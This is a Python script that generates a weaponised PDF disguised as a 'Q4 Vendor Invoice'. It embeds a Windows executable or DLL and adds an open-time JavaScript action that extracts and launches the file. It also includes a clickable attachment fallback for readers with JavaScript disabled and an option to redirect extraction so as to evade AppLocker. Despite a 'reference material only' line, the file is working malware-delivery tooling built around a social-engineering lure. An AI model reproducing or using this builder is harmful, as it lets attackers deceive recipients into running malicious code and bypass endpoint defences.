#!/usr/bin/env python3
"""
build_pdf_payload.py

Generates a PDF that:
  - embeds a Windows payload (exe or DLL)
  - fires an /OpenAction JavaScript entry on open
  - calls exportDataObject with nLaunch=1 to prompt the user
  - shows a visible page-level attachment icon as a JS-disabled fallback
  - supports the cPath option to redirect extraction out of %TEMP% for
    AppLocker escape (see HARDENED.md)

Usage:
    # Standard exe payload
    python3 build_pdf_payload.py --exe payload.exe --out Q4_Invoice.pdf

    # AppLocker-hardened target: extract to ProgramData instead of %TEMP%
    python3 build_pdf_payload.py --exe payload.exe --out Q4_Invoice.pdf \
        --cpath "C:\\\\ProgramData\\\\Microsoft\\\\"

Reference material only. See README.md, BUILD.md, HARDENED.md.
"""

import argparse
import zlib


def build_pdf(exe_path: str, exe_name: str, out_path: str,
              cpath: str = None) -> None:
    with open(exe_path, "rb") as f:
        exe_bytes = f.read()

    compressed_exe = zlib.compress(exe_bytes)

    page_content = b"""BT
/F1 12 Tf
72 720 Td
(Q4 Vendor Invoice - Summary View) Tj
0 -20 Td
/F1 10 Tf
(Full invoice is attached as an embedded file.) Tj
0 -14 Td
(Click the attachment icon on the left to open.) Tj
0 -40 Td
/F1 9 Tf
(If the attachment icon is not visible, use File > Attachments.) Tj
ET"""

    # Build the JS. If cPath is provided, redirect extraction out of %TEMP%.
    if cpath:
        cpath_escaped = cpath.replace("\\", "\\\\")
        js = (
            "app.alert('Loading invoice viewer...', 3);"
            f"this.exportDataObject({{cName: '{exe_name}', "
            f"nLaunch: 1, cPath: '{cpath_escaped}'}});"
        ).encode("utf-8")
    else:
        js = (
            "app.alert('Loading invoice viewer...', 3);"
            f"this.exportDataObject({{cName: '{exe_name}', nLaunch: 1}});"
        ).encode("utf-8")

    objects = []

    objects.append(
        b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R "
        b"/Names << /EmbeddedFiles << /Names [(" + exe_name.encode() + b") 6 0 R] >> >> >>"
    )
    objects.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    objects.append(
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Resources << /Font << /F1 8 0 R >> >> /Contents 4 0 R /Annots [9 0 R] >>"
    )
    objects.append(
        b"<< /Length " + str(len(page_content)).encode() + b" >>\nstream\n"
        + page_content + b"\nendstream"
    )
    objects.append(
        b"<< /S /JavaScript /JS ("
        + js.replace(b"\\", b"\\\\").replace(b"(", b"\\(").replace(b")", b"\\)")
        + b") >>"
    )
    objects.append(
        b"<< /Type /Filespec /F (" + exe_name.encode() + b") "
        b"/UF (" + exe_name.encode() + b") /EF << /F 7 0 R >> >>"
    )
    objects.append(
        b"<< /Type /EmbeddedFile /Subtype /application#2Foctet-stream "
        b"/Length " + str(len(compressed_exe)).encode() + b" "
        b"/Filter /FlateDecode "
        b"/Params << /Size " + str(len(exe_bytes)).encode() + b" >> >>\n"
        b"stream\n" + compressed_exe + b"\nendstream"
    )
    objects.append(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")
    objects.append(
        b"<< /Type /Annot /Subtype /FileAttachment /Rect [72 640 92 660] "
        b"/FS 6 0 R /Name /Paperclip "
        b"/Contents (Click to view invoice details) /F 0 >>"
    )

    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")

    xref_offsets = [0]
    for i, obj in enumerate(objects, start=1):
        xref_offsets.append(len(out))
        out += str(i).encode() + b" 0 obj\n" + obj + b"\nendobj\n"

    xref_start = len(out)
    out += b"xref\n0 " + str(len(objects) + 1).encode() + b"\n0000000000 65535 f \n"
    for off in xref_offsets[1:]:
        out += f"{off:010d} 00000 n \n".encode()

    out += (
        b"trailer\n<< /Size " + str(len(objects) + 1).encode() + b" /Root 1 0 R >>\n"
        b"startxref\n" + str(xref_start).encode() + b"\n%%EOF\n"
    )

    with open(out_path, "wb") as f:
        f.write(out)

    cpath_note = f" (cPath={cpath})" if cpath else ""
    print(f"[+] Wrote {out_path} ({len(out)} bytes, "
          f"embedded {len(exe_bytes)} byte payload){cpath_note}")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--exe",  required=True,
                    help="Path to the exe or DLL to embed")
    ap.add_argument("--out",  required=True, help="Output PDF path")
    ap.add_argument("--name", default="Q4_Invoice_Update.exe",
                    help="Filename shown inside the PDF attachment prompt")
    ap.add_argument("--cpath", default=None,
                    help="Optional extraction path (AppLocker escape). "
                         "Example: 'C:\\\\ProgramData\\\\Microsoft\\\\'")
    args = ap.parse_args()
    build_pdf(args.exe, args.name, args.out, args.cpath)


if __name__ == "__main__":
    main()
